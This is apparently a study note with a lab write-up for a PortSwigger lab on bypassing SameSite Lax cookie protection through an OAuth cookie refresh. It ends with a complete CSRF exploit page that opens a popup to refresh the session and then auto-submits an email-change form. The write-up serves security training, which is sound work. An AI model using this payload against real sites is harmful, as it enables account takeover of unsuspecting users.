---
tags:
  - PRACTITIONER
  - Lax
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
---

# `SameSite` Lax bypass via cookie refresh
---

> [!NOTE] NOTE
> To avoid breaking single sign-on (SSO) mechanisms, the browser doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

> [!hint] Hint
> Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:
> ```html
> \<script>
> 	window.onclick = () => {
> 		window.open('about:blank')
> 	}
> \</script>
> ```

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - satisfied

- **Solution**
	- Study the change email function
		1. The `POST /my-account/change-email` request doesn't contain any unpredictable tokens.
		2. `GET /oauth-callback?code=[...]` request. Notice that the website doesn't explicitly specify any `SameSite` restrictions when setting session cookies. As a result, the browser will use the default `Lax` restriction level.
	- Attempt a CSRF attack
	- Bypass the `SameSite` restrictions
	- Bypass the popup blocker
		```html
		<html>
			<body>
				<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
					<input type="hidden" name="email" value="pwned@bar.com" />
				</form>
				<p>Click anywhere on the page</p>
				<script>
					window.onclick = () => {
						window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
						setTimeout(changeEmail, 5000);
					}
					function changeEmail(){
						document.forms[0].submit();
					}
				</script>
			</body>
		</html>
		```


